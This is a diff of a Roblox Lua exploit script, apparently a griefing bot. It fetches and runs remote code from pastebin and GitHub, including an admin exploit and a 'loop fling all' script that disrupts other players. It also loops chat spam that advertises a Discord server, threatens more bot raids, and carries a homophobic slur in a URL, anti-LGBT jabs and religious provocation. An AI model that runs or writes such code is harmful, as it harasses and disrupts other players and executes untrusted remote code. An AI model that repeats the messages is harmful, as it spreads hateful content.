@@ -20,20 +20,14 @@ if game.Players.LocalPlayer.UserId == 4170058160 then wait(9e9) elseif game.Play
     local WS = game.Workspace
     local PLR = game.Players
     local RIG = PLR.LocalPlayer.Character.Humanoid.RigType
-    game.Players.LocalPlayer.CharacterAdded:Connect(function()
-        wait(1)
-        if RIG == Enum.HumanoidRigType.R15 then
-            PLR.LocalPlayer.Character.RightUpperArm:Destroy()
-        else
-            PLR.LocalPlayer.Character["Right Arm"]:Destroy()
-        end
-    end)
+
 script=loadstring(game:HttpGet("https://pastebin.com/raw/XXPTpkcZ", true))()
     function say(msg)
         game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
     end
     loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/tEMMIE6823/fates-admin-but-without-shitty-api-limits-cuz-they-support-the-gays-wtf/main/main.lua"))() -- fates admin without the shitty limit
+
+ -- fates admin without the shitty limit
     for _,v in pairs(workspace:GetDescendants()) do
         if v.ClassName == "Part"
             or v.ClassName == "SpawnLocation"
@@ -82,8 +76,7 @@ script=loadstring(game:HttpGet("https://pastebin.com/raw/XXPTpkcZ", true))()
 -- list of shit to say, knock urself out and change up the shit
 Thingers = {
 '[:X>nc:] Mad? Good! Join our server or we will launch more bots into the server kek: || d sc . gg/k pg PG qmj By ',
-'[:X>nc:] OmG bEcAuSe i hAte Em i mUsT tHiNk Im sIgMa! - said no one ever || d sc . gg/k pg PG qmj By ,
-'[:X>nc:] Ever wanted an executor with NO Limits, NO Advertisments and NO KEYS Whilst being ENTIRELY FREE? Try X>nc, We are open source || d sc . gg/k pg PG qmj By',
+'[:X>nc:] OmG bEcAuSe i hAte Em i mUsT tHiNk Im sIgMa! - said no one ever || d sc . gg/k pg PG qmj By ',
 '[:X>nc:] These kids are so mad that they are using threats to try make us stop LOL || d sc . gg/k pg PG qmj By',
 '[:X>nc:] RRRAAHHHHHHHHH 👶👶👶👶 || d sc . gg/k pg PG qmj By',
 '[:X>nc:] BOUBSIES❗❗❗❗ || d sc . gg/k pg PG qmj By',
@@ -91,15 +84,14 @@ Thingers = {
 '[:X>nc:] Uncle ben what happened to you 😭😭😭😭😭 || d sc . gg/k pg PG qmj By',
 '[:X>nc:] Green M&M Wussy 💀💀💀💀💀💀💀💀 || d sc . gg/k pg PG qmj By',
 '[:X>nc:] Dont believe these idiots, They are trying to push a new world order onto you LOL 🌈❌🌈❌',
+'[:X>nc:] Go read the Quran, The bible is corrupted and it also contradicts itself, Dont believe me? We will prove it kek || d sc . gg/k pg PG qmj By',
 }
 
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/loop%20fling%20all'),true))()
-    cht("!disablesit")
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/tEMMIE6823/Scripts/main/CPUSaver.lua'),true))()
-    local camera = game.Workspace.CurrentCamera
+--[[    local camera = game.Workspace.CurrentCamera
     camera.CameraType = Enum.CameraType.Scriptable
-    camera.CFrame = CFrame.new(20000, -20000, 20000)
+    camera.CFrame = CFrame.new(20000, -20000, 20000)]]--
 
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/loop%20fling%20all'),true))()
     repeat
         check()
         say(Thingers[math.random(1, #Thingers)])
